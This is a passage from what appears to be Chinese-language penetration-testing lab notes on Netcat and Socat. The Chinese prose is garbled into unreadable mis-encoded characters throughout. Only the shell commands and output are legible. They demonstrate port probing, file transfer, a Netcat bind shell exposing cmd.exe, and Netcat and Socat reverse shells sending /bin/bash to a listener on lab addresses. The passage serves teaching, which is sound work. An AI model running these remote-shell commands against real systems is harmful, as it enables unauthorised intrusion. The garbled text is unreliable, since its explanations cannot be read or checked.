å¯èƒ½æ˜¯è®¤å‡º HISTSIZE å’Œ HISTFILESIZE ç¯å¢ƒå˜é‡å’Œæ˜¾ç¤ºå½©è‰²è¾“å‡ºçš„ alias å‘½ä»¤ã€‚\n\n# å®ç”¨å·¥å…·\n\n## Netcat\n\nNetcatï¼Œç”± Hobbit äº 1995 å¹´é¦–æ¬¡å‘å¸ƒï¼Œæ˜¯ â€œåŸå§‹â€ çš„ç½‘ç»œæ¸—é€æµ‹è¯•å·¥å…·ä¹‹ä¸€ï¼Œå®ƒçš„åŠŸèƒ½éå¸¸å…¨é¢ï¼Œä¸æ„§æ˜¯ä½œè€…æŒ‡å®šçš„é»‘å®¢çš„ â€œç‘å£«å†›åˆ€â€ã€‚Netcat æœ€æ¸…æ™°çš„å®šä¹‰æ¥è‡ª Hobbit æœ¬äººï¼šä¸€ä¸ªç®€å•çš„ â€œä½¿ç”¨ TCP æˆ– UDP åè®®ï¼Œåœ¨ç½‘ç»œè¿æ¥ä¸­è¯»å†™æ•°æ®çš„å·¥å…·â€ã€‚\n\n### è¿æ¥åˆ°ä¸€ä¸ª TCP/UDP ç«¯å£\n\næ­£å¦‚æè¿°æ‰€æç¤ºçš„ï¼ŒNetcat å¯ä»¥åœ¨å®¢æˆ·æˆ–æœåŠ¡å™¨æ¨¡å¼ä¸‹è¿è¡Œã€‚é¦–å…ˆï¼Œè®©æˆ‘ä»¬çœ‹ä¸€ä¸‹å®¢æˆ·ç«¯æ¨¡å¼ã€‚\n\næˆ‘ä»¬å¯ä»¥ä½¿ç”¨å®¢æˆ·ç«¯æ¨¡å¼è¿æ¥åˆ°ä»»ä½• TCP/UDP ç«¯å£ï¼Œå…è®¸æˆ‘ä»¬ï¼š\n\n- æ£€æŸ¥ä¸€ä¸ªç«¯å£æ˜¯å¦å¼€æ”¾æˆ–å…³é—­\n- ä»æŸä¸ªç«¯å£ä¸Šç›‘å¬çš„æœåŠ¡ä¸­è¯»å–æ¨ªå¹…\n- æ‰‹åŠ¨è¿æ¥åˆ°ä¸€ä¸ªç½‘ç»œæœåŠ¡\n\nè®©æˆ‘ä»¬é¦–å…ˆä½¿ç”¨ Netcatï¼ˆncï¼‰æ¥æ£€æŸ¥ TCP 110 ç«¯å£ï¼ˆPOP3 é‚®ä»¶æœåŠ¡ï¼‰æ˜¯å¦åœ¨å®éªŒå®¤çš„ä¸€å°æœºå™¨ä¸Šæ‰“å¼€ã€‚æˆ‘ä»¬å°†æä¾›å‡ ä¸ªå‚æ•°ï¼š `-n` é€‰é¡¹ç”¨äºè·³è¿‡ DNS åç§°è§£æï¼› `-v` ç”¨äºå¢åŠ ä¸€äº›ç²—ç•¥çš„å†…å®¹ï¼›ç›®æ ‡ IP åœ°å€ï¼›ä»¥åŠç›®æ ‡ç«¯å£å·ï¼š\n\n```bash\nkali@kali:~$ nc -nv 10.11.0.22 110\n(UNKNOWN) [10.11.0.22] 110 (pop3) open\n+OK POP3 server lab ready <00003.1277944@lab>\n```\n\né¦–å…ˆï¼Œä¸ 10.11.0.22 ç«¯å£ 110ï¼ˆæ ‡å‡†å±äºä¸º 10.11.0.22:110ï¼‰çš„ TCP è¿æ¥æˆåŠŸäº†ï¼Œæ‰€ä»¥ Netcat æŠ¥å‘Šè¿œç¨‹ç«¯å£æ˜¯å¼€æ”¾çš„ã€‚æ¥ä¸‹æ¥ï¼ŒæœåŠ¡å™¨é€šè¿‡ â€œå›è¯â€ æ¥å›åº”æˆ‘ä»¬çš„è¿æ¥ï¼Œæ‰“å°å‡ºæœåŠ¡å™¨æ¬¢è¿ä¿¡æ¯ï¼Œå¹¶æç¤ºæˆ‘ä»¬ç™»å½•ï¼Œè¿™æ˜¯ POP3 æœåŠ¡çš„æ ‡å‡†è¡Œä¸ºã€‚\n\nè®©æˆ‘ä»¬è¯•ç€ä¸æœåŠ¡å™¨è¿›è¡Œäº¤äº’ã€‚\n\n```bash\nkali@kali:~$ nc -nv 10.11.0.22 110\n(UNKNOWN) [10.11.0.22] 110 (pop3) open\n+OK POP3 server lab ready <00004.1546827@lab>\nUSER offsec\n+OK offsec welcome here\nPASS offsec\n-ERR unable to lock mailbox\nquit\n+OK POP3 server lab signing off.\nkali@kali:~$\n```\n\næˆ‘ä»¬å·²ç»æˆåŠŸçš„ä½¿ç”¨ Netcat ä¸ POP3 æœåŠ¡è¿›è¡Œäº†äº¤æµï¼ˆå°½ç®¡æˆ‘ä»¬çš„ç™»å½•å°è¯•å¤±è´¥äº†ï¼‰ã€‚\n\n### ç›‘å¬ TCP/UDP ç«¯å£\n\nä½¿ç”¨ Netcat ç›‘å¬ TCP/UDP ç«¯å£å¯¹äºå®¢æˆ·ç¨‹åºçš„ç½‘ç»œè°ƒè¯•æˆ–æ¥æ”¶ TCP/UDP ç½‘ç»œè¿æ¥éå¸¸æœ‰ç”¨ã€‚è®©æˆ‘ä»¬å°è¯•å®ç°ä¸€ä¸ªæ¶‰åŠä¸¤å°æœºå™¨çš„ç®€å•èŠå¤©æœåŠ¡ï¼Œä½¿ç”¨ Netcat ä½œä¸ºå®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ã€‚\n\nåœ¨ä¸€å° IP ä¸º 10.11.0.22 çš„ Windows æœºå™¨ä¸Šï¼Œæˆ‘ä»¬å°† Netcat è®¾ç½®ä¸ºç›‘å¬ TCP 4444 ç«¯å£ä¸Šçš„ä¼ å…¥è¿æ¥ã€‚æˆ‘ä»¬å°†ä½¿ç”¨ `-n` é€‰é¡¹ç¦ç”¨ DNS åç§°è§£æï¼Œ `-l` åˆ›å»ºä¸€ä¸ªç›‘å¬å™¨ï¼Œ `-v` å¢åŠ ä¸€äº›è¯¦æƒ…ä¿¡æ¯ï¼Œ `-p` æŒ‡å®šç›‘å¬ç«¯å£å·ã€‚\n\n```bash\nC:\\\\Users\\\\offsec> nc -nlvp 4444\nlistening on [any] 4444 ...\n```\n\nç°åœ¨æˆ‘ä»¬å·²ç»å°† Windows æœºå™¨ä¸Šçš„ 4444 ç«¯å£ä¸ Netcat ç»‘å®šï¼Œè®©æˆ‘ä»¬ä» Llinux æœºå™¨ä¸Šè¿æ¥åˆ°è¯¥ç«¯å£å¹¶è¾“å…¥ä¸€è¡Œå­—ã€‚\n\n```bash\nkali@kali:~$ nc -nv 10.11.0.22 4444\n(UNKNOWN) [10.11.0.22] 4444 (?) open\nThis chat is from the linux machine\n```\n\næˆ‘ä»¬çš„æ–‡æœ¬å°†é€šè¿‡ TCP ç«¯å£ 4444 å‘é€åˆ° Windows æœºå™¨ä¸Šï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ Windows æœºå™¨ä¸Šç»§ç»­ â€œèŠå¤©â€ã€‚\n\n```bash\nC:\\\\Users\\\\offsec> nc -nlvp 4444\nlistening on [any] 4444 ...\nconnect to [10.11.0.22] from <UNKNOWN) [10.11.0.4] 43447\nThis chat is from the linux machine\n\nThis chat is from the windows machine\n```\n\n### ç”¨ Netcat ä¼ è¾“æ–‡ä»¶\n\nNetcat ä¹Ÿå¯ä»¥ç”¨æ¥ä»ä¸€å°è®¡ç®—æœºå‘å¦ä¸€å°è®¡ç®—æœºä¼ è¾“æ–‡ä»¶ï¼ŒåŒ…æ‹¬æ–‡æœ¬å’ŒäºŒè¿›åˆ¶æ–‡ä»¶ã€‚äº‹å®ä¸Šï¼Œå–è¯è°ƒæŸ¥å‘˜ç»å¸¸å°† Netcat å’Œ ddï¼ˆç£ç›˜å¤åˆ¶å·¥å…·ï¼‰ç»“åˆä½¿ç”¨ï¼Œåœ¨ç½‘ç»œä¸Šåˆ›å»ºç¬¦åˆå–è¯è¦æ±‚çš„ç£ç›˜å›¾åƒã€‚\n\nä¸ºäº†ä»æˆ‘ä»¬çš„ Kali è™šæ‹Ÿæœºå‘ Windows ç³»ç»Ÿå‘é€æ–‡ä»¶ï¼Œæˆ‘ä»¬å¯åŠ¨äº†ä¸€ä¸ªä¸ä¹‹å‰çš„èŠå¤©ä¾‹å­ç±»ä¼¼çš„è®¾ç½®ï¼Œä½†æœ‰ä¸€äº›è½»å¾®çš„ä¸åŒã€‚åœ¨ Windows æœºå™¨ä¸Šï¼Œæˆ‘ä»¬å°†åœ¨ 4444 ç«¯å£è®¾ç½®ä¸€ä¸ª Netcat ç›‘å¬å™¨ï¼Œå¹¶å°†ä»»ä½•è¾“å‡ºé‡å®šå‘åˆ°ä¸€ä¸ªåä¸º incoming.exe æ–‡ä»¶ã€‚\n\n```bash\nC:\\\\Users\\\\offsec> nc -nlvp 4444 > incoming.exe\nlistening on [any] 4444 ...\n```\n\nåœ¨ kali ç³»ç»Ÿä¸­ï¼Œæˆ‘ä»¬å°†é€šè¿‡ TCP 4444 ç«¯å£å°† wget.exe æ–‡ä»¶æ¨é€åˆ° Windows æœºå™¨ä¸Šã€‚\n\n```bash\nkali@kali:~$ locate wget.exe\n/usr/share/windows-resources/binaries/wget.exe\n\nkali@kali:~$ nc -nv 10.11.0.22 4444 < /usr/share/windows-resources/binaries/wget.exe\n(UNKNOWN) [10.11.0.22] 4444 (?) open\n```\n\nè¿æ¥ç”± Windows ä¸Šçš„ Netcat æ¥æ”¶ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š\n\n```bash\nC:\\\\Users\\\\offsec> nc -nlvp 4444 > incoming.exe\nlistening on [any] 4444 ...\nconnect to [10.11.0.22] from <UNKNOWN) [10.11.0.4] 43459\n^C\nC:\\\\Users\\\\offsec>\n```\n\nè¯·æ³¨æ„ï¼Œæˆ‘ä»¬æ²¡æœ‰æ”¶åˆ° Netcat å¯¹æˆ‘ä»¬æ–‡ä»¶ä¸Šä¼ è¿›åº¦çš„ä»»ä½•åé¦ˆã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œç”±äºæˆ‘ä»¬ä¸Šä¼ çš„æ–‡ä»¶å¾ˆå°ï¼Œæˆ‘ä»¬å¯ä»¥å…ˆç­‰å¾…å‡ ç§’é’Ÿï¼Œç„¶åé€šè¿‡å°è¯•è¿è¡Œæ–‡ä»¶æ¥æ£€æŸ¥æ–‡ä»¶æ˜¯å¦å·²ç»å®Œå…¨ä¸Šä¼ åˆ° Windows æœºå™¨ä¸Šã€‚\n\n```bash\nC:\\\\Users\\\\offsec> incoming.exe -h\nGNU Wget 1.9.1, a non-interactive network retriever.\nUsage: incoming [OPTION]... [URL]...\n```\n\næˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œè¿™å®é™…ä¸Šæ˜¯ wget.exe å¯æ‰§è¡Œæ–‡ä»¶ï¼Œè€Œä¸”æ–‡ä»¶ä¼ è¾“æˆåŠŸäº†ã€‚\n\n### ç”¨ Netcat è¿›è¡Œè¿œç¨‹ç®¡ç†\n\nNetcat æœ€æœ‰ç”¨çš„åŠŸèƒ½ä¹‹ä¸€æ˜¯å®ƒèƒ½å¤Ÿè¿›è¡Œå‘½ä»¤é‡å®šå‘ã€‚Netcat-traditional ç‰ˆæœ¬çš„ Netcatï¼ˆç”¨ â€œ-DGAPING_SECURITY_HOLEâ€ æ ‡å¿—ç¼–è¯‘ï¼‰å¯ç”¨äº† `-e` é€‰é¡¹ã€‚åœ¨å»ºç«‹æˆ–æ¥æ”¶ä¸€ä¸ªæˆåŠŸçš„è¿æ¥åæ‰§è¡Œä¸€ä¸ªç¨‹åºã€‚è¿™ä¸ªå¼ºå¤§çš„åŠŸèƒ½ä»å®‰å…¨çš„è§’åº¦å¼€è¾Ÿäº†å„ç§æœ‰è¶£çš„å¯èƒ½æ€§ï¼Œå› æ­¤åœ¨å¤§å¤šæ•°ç°ä»£ Linux/BSD ç³»ç»Ÿä¸­æ˜¯ä¸å¯ç”¨çš„ã€‚ç„¶è€Œï¼Œç”±äº Kali Linux æ˜¯ä¸€ä¸ªæ¸—é€æµ‹è¯•å‘è¡Œç‰ˆï¼ŒKali ä¸­åŒ…å«çš„ Netcat ç‰ˆæœ¬æ”¯æŒ `-e` é€‰é¡¹ã€‚\n\nå¯ç”¨åï¼Œè¯¥é€‰é¡¹å¯æ‰§è¡Œæ–‡ä»¶çš„è¾“å…¥ã€è¾“å‡ºå’Œé”™è¯¯ä¿¡æ¯é‡å®šå‘åˆ°ä¸€ä¸ª TCP/UDP ç«¯å£ï¼Œè€Œä¸æ˜¯é»˜è®¤çš„æ§åˆ¶å°ã€‚\n\nä¾‹å¦‚ï¼Œè€ƒè™‘ cmd.exe å¯æ‰§è¡Œæ–‡ä»¶ã€‚é€šè¿‡å°† stdinã€stdout å’Œ stderr é‡å®šå‘åˆ°ç½‘ç»œï¼Œæˆ‘ä»¬å¯ä»¥å°† cmd.exe ç»‘å®šåˆ°ä¸€ä¸ªæœ¬åœ°ç«¯å£ã€‚ä»»ä½•è¿æ¥åˆ°è¿™ä¸ªç«¯å£çš„äººéƒ½ä¼šåœ¨ç›®æ ‡è®¡ç®—æœºä¸Šçœ‹åˆ°ä¸€ä¸ªå‘½ä»¤æç¤ºã€‚ä¸ºäº†å¼„æ¸…æ¥šè¿™ä¸€ç‚¹ï¼Œè®©æˆ‘ä»¬å†è¿è¡Œå‡ ä¸ªæ¶‰åŠåˆ° Bob å’Œé¥¿Alice çš„åœºæ™¯ã€‚\n\n- **Netcat æ­£å‘ Shell åœºæ™¯**\n\n  å†æˆ‘ä»¬çš„ç¬¬ä¸€ä¸ªåœºæ™¯ä¸­ï¼ŒBobï¼ˆè¿è¡Œ Windowsï¼‰è¯·æ±‚ Aliceï¼ˆè¿è¡Œ Linuxï¼‰çš„å¸®åŠ©ï¼Œå¹¶è¦æ±‚å¥¹è¿æ¥åˆ°ä»–çš„è®¡ç®—æœºå¹¶è¿œç¨‹å‘å¸ƒä¸€äº›å‘½ä»¤ã€‚Bob æœ‰ä¸€ä¸ªå…¬å…± IP åœ°å€ï¼Œå¹¶ç›´æ¥è¿æ¥åˆ°äº’è”ç½‘ã€‚ç„¶è€Œï¼ŒAlice å†ä¸€ä¸ª NAT çš„è¿æ¥åé¢ï¼Œæœ‰ä¸€ä¸ªå†…éƒ¨ IP åœ°å€ã€‚ä¸ºäº†å®Œæˆè¿™ä¸ªæ–¹æ¡ˆï¼ŒBob éœ€è¦å°† cmd.exe ç»‘å®šåˆ°ä»–çš„å…¬å…± IP åœ°å€ä¸Šçš„ä¸€ä¸ªTCPç«¯å£ï¼Œå¹¶è¦æ±‚ Alice è¿æ¥åˆ°ä»–çš„ç‰¹å®š IP åœ°å€å’Œç«¯å£ã€‚\n\n  Bob å°†æ£€æŸ¥ä»–çš„æœ¬åœ° IP åœ°å€ï¼Œç„¶åç”¨ `-e` é€‰é¡¹è¿è¡Œ Netcatï¼Œä¸€æ—¦è¿æ¥åˆ°ç›‘å¬ç«¯å£å°±æ‰§è¡Œ cmd.exeã€‚\n\n  ```bash\n  C:\\\\Users\\\\offsec> ipconfig\n  Windows IP Configuration\n  Ethernet adapter Local Area Connection:\n  \tConnection-specific DNS Suffix . :\n  \tIPv4 Address. . . . . . . . . . . : 10.11.0.22\n  \tSubnet Mask . . . . . . . . . . . : 255.255.0.0\n  \tDefault Gateway . . . . . . . . . : 10.11.0.1\n  \n  C:\\\\Users\\\\offsec> nc -nlvp 4444 -e cmd.exe\n  listening on [any] 4444 ...\n  ```\n\n  ç°åœ¨ Netcat å·²ç»å°† TCP 4444 ç«¯å£ä¸ cmd.exe ç»‘å®šï¼Œå¹¶å°† cmd.exe çš„ä»»ä½•è¾“å…¥ã€è¾“å‡ºæˆ–é”™è¯¯ä¿¡æ¯é‡å®šå‘åˆ°ç½‘ç»œã€‚æ¢å¥è¯è¯´ï¼Œä»»ä½•è¿æ¥åˆ° Bob æœºå™¨ä¸Šçš„ TCP 4444 ç«¯å£çš„äººï¼ˆå¸Œæœ›æ˜¯ Aliceï¼‰éƒ½ä¼šçœ‹åˆ° Bob çš„å‘½ä»¤æç¤ºã€‚è¿™çš„ç¡®æ˜¯ä¸€ä¸ªâ€œå·¨å¤§çš„å®‰å…¨æ¼æ´â€ï¼\n\n  ```bash\n  kali@kali:~$ ip address show eth0 | grep inet\n   inet 10.11.0.4/16 brd 10.11.255.255 scope global dynamic eth0\n  \n  kali@kali:~$ nc -nv 10.11.0.22 4444\n  (UNKNOWN) [10.11.0.22] 4444 (?) open\n  Microsoft Windows [Version 10.0.17134.590]\n  (c) 2018 Microsoft Corporation. All rights reserved.\n  \n  C:\\\\Users\\\\offsec> ipconfig\n  Windows IP Configuration\n  Ethernet adapter Local Area Connection:\n   Connection-specific DNS Suffix . :\n   IPv4 Address. . . . . . . . . . . : 10.11.0.22\n   Subnet Mask . . . . . . . . . . . : 255.255.0.0\n   Default Gateway . . . . . . . . . : 10.11.0.1\n  ```\n\n  æ­£å¦‚æˆ‘ä»¬æ‰€çœ‹åˆ°çš„ï¼Œè¿™ä¸é¢„æœŸçš„å·¥ä½œä¸€æ ·ã€‚ä¸‹é¢çš„å›¾ç‰‡æè¿°äº†è¿™ç§æƒ…å†µï¼š\n\n  ![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/06439b20-99f3-4456-a7a9-f02e37534e70/Untitled.png)\n\n- **åå‘ Shell åœºæ™¯**\n\n  åœ¨æˆ‘ä»¬çš„ç¬¬äºŒä¸ªåœºæ™¯ä¸­ï¼ŒAlice éœ€è¦ Bob çš„å¸®åŠ©ã€‚ç„¶è€Œï¼ŒAlice å¯¹å¥¹åŠå…¬å®¤é‡Œçš„è·¯ç”±å™¨æ²¡æœ‰æ§åˆ¶æƒï¼Œå› æ­¤ä¸èƒ½å°†æµé‡ä»è·¯ç”±å™¨è½¬å‘åˆ°å¥¹çš„æœºå™¨å†…éƒ¨ã€‚\n\n  åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ Netcat çš„å¦ä¸€ä¸ªæœ‰ç”¨çš„åŠŸèƒ½ï¼›èƒ½å¤Ÿå‘é€å‘½ä»¤ Shell åˆ°ä¸€ä¸ªç‰¹å®šçš„ç«¯å£ä¸Šç›‘å¬çš„ä¸»æœºã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå°½ç®¡ Alice ä¸èƒ½åœ¨å¥¹çš„è®¡ç®—æœºä¸Šä¸º /bin/bash ç»‘å®šä¸€ä¸ªç«¯å£ï¼Œå¹¶æœŸæœ› Bob èƒ½å¤Ÿè¿æ¥ï¼Œä½†å¥¹å¯ä»¥å°†å¥¹çš„å‘½ä»¤æç¤ºç¬¦çš„æ§åˆ¶æƒå‘é€ç»™ Bob çš„æœºå™¨ã€‚è¿™å°±æ˜¯æ‰€è°“çš„åå‘ Shellã€‚ä¸ºäº†å®ç°è¿™ä¸ªç›®çš„ï¼ŒBob é¦–å…ˆè¦è®¾ç½® Netcat æ¥ç›‘å¬ä¸€ä¸ªä¼ å…¥çš„ Shellã€‚åœ¨æˆ‘ä»¬çš„ä¾‹å­ä¸­ï¼Œæˆ‘ä»¬å°†ä½¿ç”¨ 4444 ç«¯å£ã€‚\n\n  ```bash\n  C:\\\\Users\\\\offsec> nc -nlvp 4444\n  listening on [any] 4444 ...\n  ```\n\n  ç°åœ¨ï¼ŒAlice å¯ä»¥ä»å¥¹çš„ Linux æœºå™¨å‘ Bob å‘é€ä¸€ä¸ªåå‘ Shellã€‚å†ä¸€æ¬¡ï¼Œæˆ‘ä»¬ä½¿ç”¨ `-e` é€‰é¡¹æ¥ä½¿ä¸€ä¸ªåº”ç”¨ç¨‹åºè¿œç¨‹å¯ç”¨ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå®ƒæ°å¥½æ˜¯ /bin/bashï¼ŒLinux shellã€‚\n\n  ```bash\n  kali@kali:~$ ip address show eth0 | grep inet\n   inet 10.11.0.4/16 brd 10.11.255.255 scope global dynamic eth0\n  \n  kali@kali:~$ nc -nv 10.11.0.22 4444 -e /bin/bash\n  (UNKNOWN) [10.11.0.22] 4444 (?) open\n  ```\n\n  ä¸€æ—¦è¿æ¥å»ºç«‹ï¼ŒAlice çš„ Netcat å°†æŠŠ /bin/bash çš„è¾“å…¥ã€è¾“å‡ºå’Œé”™è¯¯æ•°æ®æµé‡å®šå‘åˆ° 4444 ç«¯å£çš„ Bob çš„æœºå™¨ä¸Šï¼ŒBob å¯ä»¥ä¸è¯¥ Shell äº¤äº’ã€‚\n\n  ```bash\n  C:\\\\Users\\\\offsec>nc -nlvp 4444\n  listening on [any] 4444 ...\n  connect to [10.11.0.22] from <UNKNOWN) [10.11.0.4] 43482\n  \n  ip address show eth0 | grep inet\n   inet 10.11.0.4/16 brd 10.11.255.255 scope global dynamic eth0\n  ```\n\n  èŠ±ä¸€äº›æ—¶é—´è€ƒè™‘ç»‘å®šå’Œåå‘ Shell ä¹‹é—´çš„å·®å¼‚ï¼Œä»¥åŠä»ç»„ç»‡å®‰å…¨çš„è§’åº¦æ¥çœ‹ï¼Œè¿™äº›å·®å¼‚å¯èƒ½é€‚ç”¨äºå„ç§é˜²ç«å¢™é…ç½®ã€‚é‡è¦çš„æ˜¯è¦è®¤è¯†åˆ°ï¼Œæµå‡ºçš„æµé‡ä¸æµå…¥çš„æµé‡ä¸€æ ·çš„æœ‰å®³ã€‚ä¸‹å›¾æè¿°äº†åå‘ Shell çš„æƒ…å†µï¼ŒBob åœ¨ Alice çš„ Linux æœºå™¨ä¸Šè·å¾—äº†è¿œç¨‹ Shell è®¿é—®ï¼Œç©¿è¶Šäº†å…¬å¸é˜²ç«å¢™ã€‚\n\n  ![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/81966b24-1aac-4ddb-a3d4-2573ce2698bb/Untitled.png)\n\n## Socat\n\nsocat æ˜¯ä¸€ä¸ªå‘½ä»¤è¡Œå·¥å…·ï¼Œå¯ä»¥å»ºç«‹ä¸¤ä¸ªåŒå‘çš„å­—èŠ‚æµï¼Œå¹¶åœ¨å®ƒä»¬ä¹‹é—´ä¼ è¾“æ•°æ®ã€‚å¯¹äºæ¸—é€æµ‹è¯•ï¼Œå®ƒç±»ä¼¼äº Netcatï¼Œä½†æœ‰é¢å¤–çš„æœ‰ç”¨åŠŸèƒ½ã€‚\n\nè™½ç„¶ socat å¯ä»¥åšå¾ˆå¤šäº‹æƒ…ï¼Œä½†æˆ‘ä»¬åªä»‹ç»å…¶ä¸­çš„å‡ ä¸ªï¼Œä»¥è¯´æ˜å…¶ç”¨é€”ã€‚è®©æˆ‘ä»¬å¼€å§‹æ¢ç´¢ socatï¼Œçœ‹çœ‹å®ƒä¸ Netcat çš„æ¯”è¾ƒã€‚\n\n### Netcat VS Socat\n\né¦–å…ˆï¼Œè®©æˆ‘ä»¬ç”¨ Netcat å’Œ Socat è¿æ¥åˆ° 80 ç«¯å£çš„è¿œç¨‹æœåŠ¡å™¨ã€‚\n\n```bash\nkali@kali:~$ nc <remote server's ip address> 80\n\nkali@kali:~$ socat - TCP4:<remote server's ip address>:80\n```\n\næ³¨æ„ï¼Œè¯­æ³•ç›¸ä¼¼ï¼Œä½† socat éœ€è¦ `-` åœ¨ STDIO å’Œè¿œç¨‹ä¸»æœºä¹‹é—´ä¼ è¾“æ•°æ®ï¼ˆå…è®¸æˆ‘ä»¬çš„é”®ç›˜ä¸ shell äº’åŠ¨ï¼‰å’Œåè®®ï¼ˆTCP4ï¼‰ã€‚åè®®ã€é€‰é¡¹å’Œç«¯å£å·æ˜¯å†’å·åˆ†éš”çš„ã€‚\n\nå› æ­¤å°†ç›‘å¬å™¨ç»‘å®šåˆ° 1024 ä»¥ä¸‹çš„ç«¯å£éœ€è¦ root æƒé™ï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨å¯åŠ¨ 443 ç«¯å£çš„ç›‘å¬å™¨æ—¶éœ€è¦ä½¿ç”¨ sudoã€‚\n\n```bash\nkali@kali:~$ sudo nc -lvp localhost 443\n\nkali@kali:~$ sudo socat TCP4-LISTEN:443 STDOUT\n```\n\nè¯·æ³¨æ„ï¼Œéœ€è¦æ·»åŠ ç›‘å¬å™¨çš„åè®®ï¼ˆTCP-LISTENï¼‰å’Œ STDOUT å‚æ•°ï¼Œå®ƒå¯ä»¥é‡å®šå‘æ ‡å‡†è¾“å‡ºã€‚\n\n### Socat æ–‡ä»¶ä¼ è¾“\n\næ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å°†å°è¯•ä¸€ä¸‹æ–‡ä»¶ä¼ è¾“ã€‚ç»§ç»­ä¹‹å‰è™šæ„çš„ Alice å’Œ Bob è§’è‰²ï¼Œå‡è®¾ Alice éœ€è¦ç»™ Bob å‘é€ä¸€ä¸ªå«åš secret_passwords.txt çš„æ–‡ä»¶ã€‚ä½œä¸ºæé†’ã€‚Aliceçš„ä¸»æœºè¿è¡Œåœ¨ Linuxä¸Šï¼Œè€Œ Bob çš„ä¸»æœºè¿è¡Œåœ¨ Windowsä¸Šã€‚è®©æˆ‘ä»¬æ¥çœ‹çœ‹è¿™ä¸ªåŠ¨ä½œã€‚\n\nåœ¨ Alice è¿™è¾¹ï¼Œæˆ‘ä»¬å°†åœ¨ 443 ç«¯å£å…±äº«æ–‡ä»¶ã€‚åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼ŒTCP4-LISTEN é€‰é¡¹åˆ¶å®šäº†ä¸€ä¸ª IPv4 ç›‘å¬å™¨ï¼Œä¸€æ—¦ä¸ç›‘å¬å™¨å»ºç«‹è¿æ¥ï¼Œfork å°±ä¼šåˆ›å»ºä¸€ä¸ªå­è¿›ç¨‹ï¼Œå®ƒå…è®¸å¤šä¸ªè¿æ¥ï¼Œè€Œ file: åˆ¶å®šäº†è¦ä¼ è¾“çš„æ–‡ä»¶çš„åç§°ã€‚\n\n```bash\nkali@kali:~$ sudo socat TCP4-LISTEN:443,fork file:secret_passwords.txt\n```\n\nåœ¨ Bob è¿™è¾¹ï¼Œæˆ‘ä»¬å°†è¿æ¥åˆ° Alice çš„ç”µè„‘å¹¶æ£€ç´¢æ–‡ä»¶ã€‚åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼ŒTCP4 é€‰é¡¹æŒ‡å®šäº† IPv4ï¼Œåé¢æ˜¯ Alice çš„ IP åœ°å€ï¼ˆ10.11.0.4ï¼‰å’Œç›‘å¬ç«¯å£å·ï¼ˆ443ï¼‰ï¼Œfile: æŒ‡å®šäº†åœ¨ Bob çš„è®¡ç®—æœºä¸Šä¿å­˜æ–‡ä»¶çš„æœ¬åœ°æ–‡ä»¶åï¼Œcreate æŒ‡å®šäº†å°†åˆ›å»ºä¸€ä¸ªæ–°æ–‡ä»¶ã€‚\n\n```bash\nC:\\\\Users\\\\offsec> socat TCP4:10.11.0.4:443 file:received_secret_passwords.txt,create\n\nC:\\\\Users\\\\offsec> type received_secret_passwords.txt\n\"try harder!!!\"\n```\n\n### Socat åå‘ Shell\n\nè®©æˆ‘ä»¬æ¥çœ‹çœ‹ä½¿ç”¨ socat çš„åå‘ Shellã€‚é¦–å…ˆï¼ŒBob å°†åœ¨ 443 ç«¯å£å¯åŠ¨ä¸€ä¸ªç›‘å¬å™¨ã€‚è¦åšåˆ°è¿™ä¸€ç‚¹ï¼Œä»–å°†æä¾› `-d` é€‰é¡¹æ¥å¢åŠ ç²—ç•¥æ€§ï¼ˆæ˜¾ç¤ºè‡´å‘½ã€é”™è¯¯ã€è­¦å‘Šå’Œé€šå‘Šä¿¡æ¯ï¼‰ï¼ŒTCP4-LISTEN:443 æ¥åœ¨ 443 ç«¯å£åˆ›å»ºä¸€ä¸ª IPv4 ç›‘å¬å™¨ã€‚STDOUT æ¥è¿æ¥æ ‡å‡†è¾“å‡ºï¼ˆSTDOUTï¼‰åˆ° TCP å¥—æ¥å­—ã€‚\n\n```bash\nC:\\\\Users\\\\offsec> socat -d -d TCP4-LISTEN:443 STDOUT\n... socat[4388] N listening on AF=2 0.0.0.0:443\n```\n\næ¥ä¸‹æ¥ï¼ŒAlice å°†ä½¿ç”¨ socat çš„ EXECé€‰é¡¹ï¼ˆç±»ä¼¼äº netcat çš„ `-e` é€‰é¡¹ï¼‰ï¼Œä¸€æ—¦å»ºç«‹äº†è¿œç¨‹è¿æ¥ï¼Œå®ƒå°†æ‰§è¡Œç»™å®šçš„ç¨‹åºã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼ŒAlice å°†å‘é€ä¸€ä¸ª /bin/bash åå‘ Shellï¼ˆç”¨ EXEC :/bin/bashï¼‰åˆ° Bob çš„ç›‘å¬å¥—æ¥å­— 10.11.0.22:443ã€‚\n\n```bash\nkali@kali:~$ socat TCP4:10.11.0.22:443 EXEC:/bin/bash\n```\n\nä¸€æ—¦è¿æ¥ï¼ŒBob å¯ä»¥ä»ä»–çš„ socat ç»˜ç”»ä¸­è¾“å…¥å‘½ä»¤ï¼Œè¿™äº›å‘½ä»¤å°†åœ¨ Alice çš„æœºå™¨ä¸Šæ‰§è¡Œã€‚\n\n```bash\n... socat[4388] N accepting connection from AF=2 10.11.0.4:54720 on 10.11.0.22:443\n... socat[4388] N using stdout for reading and writing\n... socat[4388] N starting data transfer loop with FDs [4,4] and [1,1]\nwhoami\nkali\nid\nuid=1000(kali) gid=1000(kali) groups=1000(kali)\n```\n\nè¿™æ˜¯ä¸€ä¸ªå¾ˆå¥½çš„å¼€å§‹ï¼Œæˆ‘ä»¬å·²ç»æ¶µç›–äº†ä¸€äº›é‡è¦çš„ä¸»é¢˜ï¼Œä½†åˆ°ç›®å‰ä¸ºæ­¢ï¼Œæˆ‘ä»¬æ‰€æœ‰çš„ socat åŠ å¯†çš„åŸºæœ¬çŸ¥è¯†ã€‚\n\n### Socat åŠ å¯†çš„ æ­£å‘ Shell\n\nä¸ºäº†ç»™ç»‘å®šçš„ Shell å¢åŠ åŠ 